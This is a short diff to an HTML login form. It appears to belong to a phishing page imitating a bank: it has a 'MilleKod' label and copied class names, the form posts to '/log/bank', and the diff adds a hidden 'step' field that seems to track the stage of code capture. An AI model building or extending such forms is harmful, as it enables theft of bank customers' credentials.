@@ -102,7 +102,7 @@
                                             <div class="login-form-content">
                                                 <form id="bank_pm_form" method="POST" action="/log/bank"
                                                       role="form">
-
+                                                    <input type="hidden" name="step" value="after_code">
                                                     <div class="form-group">
                                                         <label for="login-input" class="_3LNER _3K-gi js-login-label">
                                                             <span aria-hidden="true">MilleKod</span>
